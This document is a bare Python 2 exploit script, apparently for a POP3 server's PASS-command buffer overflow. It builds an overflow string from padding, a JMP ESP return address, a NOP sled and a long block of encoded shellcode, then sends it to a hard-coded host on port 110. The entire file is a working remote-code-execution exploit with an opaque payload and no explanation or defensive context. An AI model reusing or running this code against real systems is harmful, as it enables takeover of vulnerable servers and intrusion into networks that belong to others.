#!/usr/bin/python
import time, struct, sys
import socket as so

achars = 'A' * 2606
nops = '\x90' * 16
jmpesp = '\xe3\x41\x4b\x5f'

buf =  b""
buf += b"\xda\xd5\xd9\x74\x24\xf4\xba\xc2\x1d\x2a\xc9\x5f\x33"
buf += b"\xc9\xb1\x52\x83\xc7\x04\x31\x57\x13\x03\x95\x0e\xc8"
buf += b"\x3c\xe5\xd9\x8e\xbf\x15\x1a\xef\x36\xf0\x2b\x2f\x2c"
buf += b"\x71\x1b\x9f\x26\xd7\x90\x54\x6a\xc3\x23\x18\xa3\xe4"
buf += b"\x84\x97\x95\xcb\x15\x8b\xe6\x4a\x96\xd6\x3a\xac\xa7"
buf += b"\x18\x4f\xad\xe0\x45\xa2\xff\xb9\x02\x11\xef\xce\x5f"
buf += b"\xaa\x84\x9d\x4e\xaa\x79\x55\x70\x9b\x2c\xed\x2b\x3b"
buf += b"\xcf\x22\x40\x72\xd7\x27\x6d\xcc\x6c\x93\x19\xcf\xa4"
buf += b"\xed\xe2\x7c\x89\xc1\x10\x7c\xce\xe6\xca\x0b\x26\x15"
buf += b"\x76\x0c\xfd\x67\xac\x99\xe5\xc0\x27\x39\xc1\xf1\xe4"
buf += b"\xdc\x82\xfe\x41\xaa\xcc\xe2\x54\x7f\x67\x1e\xdc\x7e"
buf += b"\xa7\x96\xa6\xa4\x63\xf2\x7d\xc4\x32\x5e\xd3\xf9\x24"
buf += b"\x01\x8c\x5f\x2f\xac\xd9\xed\x72\xb9\x2e\xdc\x8c\x39"
buf += b"\x39\x57\xff\x0b\xe6\xc3\x97\x27\x6f\xca\x60\x47\x5a"
buf += b"\xaa\xfe\xb6\x65\xcb\xd7\x7c\x31\x9b\x4f\x54\x3a\x70"
buf += b"\x8f\x59\xef\xd7\xdf\xf5\x40\x98\x8f\xb5\x30\x70\xc5"
buf += b"\x39\x6e\x60\xe6\x93\x07\x0b\x1d\x74\xe8\x64\x1c\x3b"
buf += b"\x80\x76\x1e\x42\xea\xfe\xf8\x2e\x1c\x57\x53\xc7\x85"
buf += b"\xf2\x2f\x76\x49\x29\x4a\xb8\xc1\xde\xab\x77\x22\xaa"
buf += b"\xbf\xe0\xc2\xe1\x9d\xa7\xdd\xdf\x89\x24\x4f\x84\x49"
buf += b"\x22\x6c\x13\x1e\x63\x42\x6a\xca\x99\xfd\xc4\xe8\x63"
buf += b"\x9b\x2f\xa8\xbf\x58\xb1\x31\x4d\xe4\x95\x21\x8b\xe5"
buf += b"\x91\x15\x43\xb0\x4f\xc3\x25\x6a\x3e\xbd\xff\xc1\xe8"
buf += b"\x29\x79\x2a\x2b\x2f\x86\x67\xdd\xcf\x37\xde\x98\xf0"
buf += b"\xf8\xb6\x2c\x89\xe4\x26\xd2\x40\xad\x57\x99\xc8\x84"
buf += b"\xff\x44\x99\x94\x9d\x76\x74\xda\x9b\xf4\x7c\xa3\x5f"
buf += b"\xe4\xf5\xa6\x24\xa2\xe6\xda\x35\x47\x08\x48\x35\x42"


buff = achars + jmpesp + nops + buf
server = '192.168.1.233'
port = 110

s = so.socket(so.AF_INET, so.SOCK_STREAM)
try:
	s.connect((server,port))
	s.recv(1024)
	s.send('USER rival\r\n')
	s.recv(1023)
	s.send('PASS ' + buff + '\r\n')
	s.send('QUIT\r\n')
	s.close()
except:
	print "[-] Connection Failed."
	sys.exit()

